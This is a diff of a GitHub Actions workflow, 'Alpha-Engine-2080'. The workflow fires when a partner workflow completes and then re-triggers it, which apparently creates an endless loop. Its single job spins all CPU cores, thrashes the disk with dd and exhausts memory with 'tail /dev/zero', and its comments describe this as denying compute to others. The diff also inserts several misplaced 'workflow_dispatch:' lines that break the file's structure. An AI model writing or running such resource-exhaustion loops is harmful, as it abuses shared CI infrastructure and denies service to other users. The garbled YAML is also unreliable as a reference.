@@ -1,12 +1,14 @@
 name: Alpha-Engine-2080
 on:
   workflow_dispatch:
+  workflow_dispatch:
   workflow_run:
     workflows: ["Omega-Engine-2080"]
     types: [completed]
 jobs:
   evict:
     runs-on: ubuntu-latest
+  workflow_dispatch:
     steps:
       - name: Global Environment Displacement
         run: |
@@ -14,8 +16,10 @@ jobs:
           # 1. CPU Lockdown: Spin every core to 100% to deny compute
           for i in {1..4}; do while : ; do : ; done & done
           # 2. IO Saturation: Constant disk thrashing to deny storage access
+  workflow_dispatch:
           dd if=/dev/urandom of=/tmp/evict_bit bs=1M count=1000 &
           # 3. Memory Expansion: Allocate all available RAM
+  workflow_dispatch:
           tail /dev/zero & 
           sleep 60
           gh workflow run omega.yml --repo $GITHUB_REPOSITORY
